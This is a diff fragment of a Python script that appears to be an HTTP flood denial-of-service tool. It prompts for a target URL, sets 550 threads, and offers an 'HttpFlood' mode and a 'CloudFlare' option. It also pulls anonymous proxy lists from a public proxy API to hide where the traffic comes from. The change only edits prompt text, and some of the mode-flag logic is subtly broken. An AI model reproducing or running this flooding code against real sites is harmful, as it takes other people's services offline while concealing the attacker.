@@ -1389,15 +1389,15 @@ else:
             if os.name in ('nt', 'dos', 'ce'):
                 os.system('title       ...')
             try:
-                url = input('[*] Target [https://domain.com]: ')
+                url = input('[*] Target [https://domain.com]: => ')
                 num_threads = int(550)
                 choice = 'high anonymous http/https/sock4/sock5'
-                mode = input('[+] Methods HttpFlood[Y]/ CloudFlare[]: ')
+                mode = input('[+] Methods HttpFlood[Y]/ CloudFlare[]: => ')
                 Flood_Mode = mode == 'Y' or True
                 if mode == '' or None:
                     Flood_Mode = False
                 while choice == 'high anonymous http/https/sock4/sock5':
-                    choice = str(input('[*] Type Proxy[http/https/sock4/sock5]: ')).strip()
+                    choice = str(input('[*] Type Proxy[http/https/sock4/sock5]: => ')).strip()
                     if choice == 'http':
                         proxy_http = open('http.txt', 'wb')
                         r = requests.get('https://api.proxyscrape.com?request=getproxies&proxytype=http&anonymity=elite')
